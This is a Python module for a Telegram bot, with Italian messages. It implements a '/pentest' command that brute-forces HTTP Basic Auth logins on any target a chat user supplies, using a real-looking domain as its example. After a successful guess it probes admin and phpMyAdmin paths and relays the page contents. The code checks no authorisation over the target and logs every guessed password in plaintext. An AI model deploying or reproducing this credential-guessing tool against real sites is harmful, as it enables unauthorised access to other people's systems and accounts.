import aiohttp
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from datetime import datetime
import os
from .log_utils import append_log_entry


def escape_md(text: str) -> str:
    escape_chars = r"_*[]()~`>#+-=|{}.!\\"
    return ''.join(f'\\{c}' if c in escape_chars else c for c in text)


async def login_and_scan(session: aiohttp.ClientSession, target: str, update: Update):
    paths_to_check = ["/dashboard", "/admin", "/phpmyadmin", "/export.php"]
    found = []
    
    for path in paths_to_check:
        url = target.rstrip("/") + path
        try:
            async with session.get(url) as resp:
                status = resp.status
                text = await resp.text()
                snippet = text[:150].replace("\n", " ").strip()
                line = f"{url} -> status {status} | {snippet}"
                found.append(escape_md(line))
        except Exception as e:
            line = f"{url} -> errore: {e}"
            found.append(escape_md(line))
            
    if found:
        report = "\n".join(found)
        escaped_report = escape_md(f"🔍 Risultati post-login:\n{report}")
        await update.message.reply_text(escaped_report, parse_mode=ParseMode.MARKDOWN_V2)


async def pma_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Comando /pentest lanciato")
    user = update.effective_user
    
    if update.callback_query:
        await update.callback_query.answer()
        msg = (
            "📥 Usa il comando /pentest nel formato corretto:\n"
            "/pentest <ip|url> <user1,user2,...> <pass1,pass2,...>\n\n"
            "Esempio:\n"
            "/pentest salvatempo.livith.it/login admin,root password123,1234"
        )
        await update.callback_query.edit_message_text(escape_md(msg), parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    if update.message is None:
        return
    args = context.args
    
    if len(args) < 3:
        msg = (
            "Uso corretto:\n"
            "/pentest <ip|url> <user1,user2,...> <pass1,pass2,...>\n\n"
            "Esempio:\n"
            "/pentest salvatempo.livith.it/login admin,root password123,1234"
        )
        await update.message.reply_text(escape_md(msg), parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    target = args[0].strip()
    users = args[1].split(",")
    passwords = args[2].split(",") if len(args) > 2 else [""]
    
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
        
    append_log_entry(
        "pentest",
        user.id,
        user.username or "",
        f"target={target}, users={users}, passwords={passwords}",
        "Avvio brute force"
    )
    
    msg = f"Avvio brute force su {target} con utenti: {users} e password: {passwords}...\nMassimo 50 tentativi."
    await update.message.reply_text(escape_md(msg), parse_mode=ParseMode.MARKDOWN_V2)
    os.makedirs("logs", exist_ok=True)
    log_path = os.path.join("logs", "pentest.txt")
    session_timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(timeout=session_timeout) as session:
        found = False
        attempts = []
        max_attempts = 50
        count = 0
        
        for user_ in users:
            for pwd in passwords:
                if count >= max_attempts or found:
                    break
                count += 1
                
                try:
                    auth = aiohttp.BasicAuth(login=user_, password=pwd)
                    async with session.post(target, auth=auth, allow_redirects=True) as resp:
                        status = resp.status
                        text = await resp.text()
                        snippet = text[:100].replace("\n", " ").strip()
                        attempt_line = f"Tentativo {count}: {user_}:{pwd} -> status {status}"
                        attempts.append(escape_md(attempt_line))
                        append_log_entry(
                            "pentest",
                            user.id,
                            user.username or "",
                            f"tentativo {count}: user={user_}, pass={pwd}, target={target}",
                            f"status={status}, snippet={snippet}"
                        )
                        
                        if status == 200:
                            found = True
                            success_msg = (
                                f"✅ Login riuscito!\nUser: {user_}\nPass: {pwd}\nLink: {target}"
                            )
                            
                            await update.message.reply_text(
                                escape_md(success_msg), parse_mode=ParseMode.MARKDOWN_V2
                            )
                            append_log_entry(
                                "pentest",
                                user.id,
                                user.username or "",
                                f"tentativo {count}: user={user_}, pass={pwd}, target={target}",
                                "SUCCESS"
                            )
                            with open(log_path, "a") as log:
                                log.write(f"{datetime.now()} - SUCCESS: {user_}:{pwd} @ {target}\n")
                            await login_and_scan(session, target, update)
                            break
                        
                except aiohttp.ClientConnectorError:
                    err_msg = f"❗️ Errore nella connessione a: {target}!"
                    await update.message.reply_text(escape_md(err_msg), parse_mode=ParseMode.MARKDOWN_V2)
                    
                    append_log_entry(
                        "pentest",
                        user.id,
                        user.username or "",
                        f"tentativo {count}: user={user_}, pass={pwd}, target={target}",
                        "Connection Error"
                    )
                    return
                
                except Exception as e:
                    err_msg = f"❗️ Errore nella richiesta: {target}\n{e}!"
                    await update.message.reply_text(escape_md(err_msg), parse_mode=ParseMode.MARKDOWN_V2)
                    
                    append_log_entry(
                        "pentest",
                        user.id,
                        user.username or "",
                        f"tentativo {count}: user={user_}, pass={pwd}, target={target}",
                        f"Request Error: {str(e)}"
                    )
                    return
                
        if not found:
            await update.message.reply_text(escape_md("❌ Nessuna combinazione valida trovata!"), parse_mode=ParseMode.MARKDOWN_V2)
        report = "📋 Report tentativi:\n" + "\n".join(attempts[:max_attempts])
        
        await update.message.reply_text(escape_md(report), parse_mode=ParseMode.MARKDOWN_V2)
        
        append_log_entry(
            "pentest",
            user.id,
            user.username or "",
            f"tentativi eseguiti: {count} su target: {target}",
            "SUCCESS" if found else "FAILURE"
        )
        
        with open(log_path, "a") as log:
            log.write(f"{datetime.now()} - Tentativi eseguiti: {count} su {target}\n")